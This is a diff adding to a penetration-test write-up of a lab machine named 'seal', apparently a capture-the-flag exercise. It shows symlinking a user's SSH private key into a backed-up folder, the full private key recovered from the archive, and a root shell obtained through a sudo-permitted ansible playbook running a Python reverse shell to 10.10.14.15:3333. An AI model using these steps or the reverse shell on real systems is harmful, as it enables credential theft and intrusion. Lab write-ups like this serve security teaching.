@@ -163,7 +163,9 @@ tomcat@seal:/var/lib/tomcat9$ hostname
 seal
 tomcat@seal:/var/lib/tomcat9$ 
 ```
-The tester used the "pspy" tool to monitor the system processes 
+
+The tester used the "pspy" tool to monitor the system processes and found that the "luis" account would periodically run ansible to backup the /var/lib/tomcat9/webapps/ROOT/admin/dashboard directory to the /opt/backups/files/directory. 
+
 ```
 tomcat@seal:/tmp$ ./pspy64 
 pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
@@ -193,7 +195,147 @@ done
 
 ```
 
+```
+tomcat@seal:/tmp$ cat /opt/backups/playbook/run.yml
+- hosts: localhost
+  tasks:
+  - name: Copy Files
+    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
+  - name: Server Backups
+    archive:
+      path: /opt/backups/files/
+      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
+  - name: Clean
+    file:
+      state: absent
+      path: /opt/backups/files/
+```
+
+The Tomcat user has write access to the upload subdirectory in the dashboard filesystem. The tester was able to create a file in the upload dircetory which was linked to the SSH private key of the "luis" account. The tester used the below command, in the upload directory, to create the link. 
+
+```
+ln -s /home/luis/.ssh/id_rsa id_rsa
+```
+
+Once the backup process was completed and the file was backed up to the files directory the tester decompressed the file and used grep to find the private key.
+
+```
+tomcat@seal:/tmp$ gzip -d backup-2023-11-26-23:37:33.gz
+tomcat@seal:/tmp$ ls
+backup-2023-11-26-23:37:33  linpeas.sh	 logrotten    pspy64
+hsperfdata_tomcat	    listener.py  payloadfile  tmux-997
+tomcat@seal:/tmp$ cat "backup-2023-11-26-23:37:33" |  grep -a  BEGIN -A 37
+dashboard/uploads/id_rsa0000600000175000017500000000503600000000000015607 0ustar00luisluis00000000000000-----BEGIN OPENSSH PRIVATE KEY-----
+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
+u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=
+-----END OPENSSH PRIVATE KEY-----
+tomcat@seal:/tmp$ 
+```
+
+With the SSH key the tester was able to connect remotely to the host.  
+
+```
+┌─[✗]─[rang3r@parrot]─[~/Projects/machines/seal]
+└──╼ $ssh -i id_rsa luis@10.10.10.250
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
+
+<snip>
+
+Last login: Mon Nov 27 13:38:42 2023 from 10.10.14.15
+luis@seal:~$ sudo -l
+Matching Defaults entries for luis on seal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User luis may run the following commands on seal:
+    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
+luis@seal:~$ 
+```
+
+The "luis" account is able to run the ansible-playbook command as root using sudo. The tester set up a ".yml" playbook file which contained a python reverse shell scrpt.
+```
+luis@seal:~$ cat test_cmd.yml 
+---
+- name: List Files in a Directory
+  hosts: localhost
+  tasks:
+    - name: List files in the current directory
+      shell: python3 -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("10.10.14.15",3333));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
+      args:
+        chdir: /tmp
+      register: directory_listing
+    - name: Display the list of files
+      debug:
+        var: directory_listing.stdout_lines
+luis@seal:~$ 
+
+```
+
+```
+luis@seal:~$ sudo /usr/bin/ansible-playbook  test_cmd.yml 
+[WARNING]: provided hosts list is empty, only localhost is available. Note that
+the implicit localhost does not match 'all'
+
+PLAY [List Files in a Directory] ***********************************************
+
+TASK [Gathering Facts] *********************************************************
+ok: [localhost]
+
+TASK [List files in the current directory] *************************************
+```
+
+```
+┌─[rang3r@parrot]─[~]
+└──╼ $nc -lnvp 3333
+listening on [any] 3333 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.10.10.250] 43128
+# id    
+id
+uid=0(root) gid=0(root) groups=0(root)
+# hostname
+hostname
+seal
+# 
+```
+
 ## Mitigations 
 
-https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/
 ## References
+
+
+https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/
+
